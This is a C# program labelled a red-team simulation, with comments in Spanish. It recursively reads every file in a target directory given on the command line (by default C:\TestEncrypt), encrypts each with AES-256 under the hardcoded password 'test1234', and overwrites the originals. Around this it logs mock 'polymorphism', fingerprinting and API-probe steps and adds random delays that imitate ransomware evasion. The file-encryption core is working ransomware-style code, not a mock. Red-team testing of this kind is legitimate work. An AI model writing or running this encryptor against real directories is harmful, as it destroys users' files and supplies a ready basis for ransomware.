using System;
using System.IO;
using System.Text;
using System.Security.Cryptography;
using System.Collections.Generic;

class RedTeamSimulator
{
    static string baseDir = @"C:\TestEncrypt";
    static string logFile = Path.Combine(baseDir, "simulation_log.txt");
    static Random rnd = new Random();

    static void Main(string[] args)
    {
        Directory.CreateDirectory(baseDir);
        Log("=== Red Team Simulation Start ===");

        // Directorio objetivo
        string targetDir = args.Length > 0 ? args[0] : baseDir;

        // Ejecutar procesamiento y cifrado en memoria
        RunInMemory(targetDir, "test1234");

        Log("=== Simulation Completed Successfully ===");
    }

    static void RunInMemory(string targetDir, string password)
    {
        var fileContents = new Dictionary<string, byte[]>();

        try
        {
            foreach (var file in Directory.EnumerateFiles(targetDir, "*", SearchOption.AllDirectories))
            {
                byte[] data = File.ReadAllBytes(file);
                fileContents[file] = data;
                Log($"[InMem Load] {file}");
            }
        }
        catch (Exception ex)
        {
            Log($"[InMem Error] Enumeración/carga: {ex.Message}");
            return;
        }

        // Simulación en memoria
        MutateMemoryStrings("InitialMem", 5);
        PolymorphismIteration(4);
        DelayRandom(3000, 8000);
        FingerprintSystem();
        SimulatedAPIProbes();

        for (int i = 0; i < 3; i++)
        {
            DelayRandom(1000, 5000);
            MutateMemoryStrings($"IterationMem {i + 1}", 3);
            PolymorphismIteration(2);
            SimulatedAPIProbes();
        }

        // Cifrar en memoria
        var encryptedContents = new Dictionary<string, byte[]>();
        foreach (var kvp in fileContents)
        {
            // Evitar cifrar el propio log
            if (string.Equals(Path.GetFullPath(kvp.Key), Path.GetFullPath(logFile), StringComparison.OrdinalIgnoreCase))
            {
                encryptedContents[kvp.Key] = kvp.Value;
                continue;
            }

            byte[] encrypted = EncryptAES(kvp.Value, password);
            encryptedContents[kvp.Key] = encrypted;
            Log($"[InMem Encrypt] {kvp.Key}");
        }

        // Escribir los archivos cifrados de vuelta a disco
        foreach (var kvp in encryptedContents)
        {
            try
            {
                File.WriteAllBytes(kvp.Key, kvp.Value);
                Log($"[InMem Write] {kvp.Key}");
            }
            catch (Exception ex)
            {
                Log($"[InMem Error] Escritura: {ex.Message}");
            }
        }
    }

    static void MutateMemoryStrings(string label, int iterations)
    {
        for (int i = 0; i < iterations; i++)
        {
            string randomString = RandomString(10 + rnd.Next(10));
            Log($"[Mutate] {label} Iteration {i + 1}: {randomString}");
        }
    }

    static void PolymorphismIteration(int iterations)
    {
        for (int i = 0; i < iterations; i++)
        {
            uint val = (uint)rnd.Next();
            uint mutated = (val ^ 0xA5A5A5A5u) + 0x12345678u;
            Log($"[Polymorphism] Iteration {i + 1}: {mutated}");
        }
    }

    static void DelayRandom(int minMs, int maxMs)
    {
        int delay = rnd.Next(minMs, maxMs);
        Log($"[Delay] Waiting {delay} ms");
        System.Threading.Thread.Sleep(delay);
    }

    static void FingerprintSystem()
    {
        Log($"[Fingerprint] Machine Name: {Environment.MachineName}");
        Log($"[Fingerprint] OS Version: {Environment.OSVersion}");
        Log($"[Fingerprint] Processor Count: {Environment.ProcessorCount}");

        double totalMb = GC.GetGCMemoryInfo().TotalAvailableMemoryBytes / (1024.0 * 1024.0);
        Log($"[Fingerprint] Total Memory (MB): {totalMb:F0}");
    }

    static void SimulatedAPIProbes()
    {
        List<string> apis = new List<string> { "CreateFile", "ReadFile", "WriteFile", "OpenProcess", "EnumProcesses" };
        foreach (var api in apis)
        {
            Log($"[API Probe] Called {api}");
        }
    }

    static byte[] EncryptAES(byte[] data, string password)
    {
        const int KeyBytes = 32;
        const int Iterations = 100_000;
        byte[] salt = RandomNumberGenerator.GetBytes(16);

        using var kdf = new Rfc2898DeriveBytes(
            password,
            salt,
            Iterations,
            HashAlgorithmName.SHA256
        );

        using var aes = Aes.Create();
        aes.KeySize = 256;
        aes.Mode = CipherMode.CBC;
        aes.Padding = PaddingMode.PKCS7;
        aes.Key = kdf.GetBytes(KeyBytes);
        aes.IV = RandomNumberGenerator.GetBytes(16);

        using var ms = new MemoryStream();

        ms.Write(salt, 0, salt.Length);
        ms.Write(aes.IV, 0, aes.IV.Length);

        using (var cs = new CryptoStream(ms, aes.CreateEncryptor(), CryptoStreamMode.Write))
        {
            cs.Write(data, 0, data.Length);
            cs.FlushFinalBlock();
        }
        return ms.ToArray();
    }

    static string RandomString(int length)
    {
        const string chars = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
        var sb = new StringBuilder();
        for (int i = 0; i < length; i++)
            sb.Append(chars[rnd.Next(chars.Length)]);
        return sb.ToString();
    }

    static void Log(string message)
    {
        try
        {
            string logEntry = $"[{DateTime.Now:HH:mm:ss}] {message}";
            Directory.CreateDirectory(Path.GetDirectoryName(logFile)!);
            File.AppendAllText(logFile, logEntry + Environment.NewLine);
        }
        catch
        {
            // Ignorar errores de log para no detener simulación
        }
    }
}
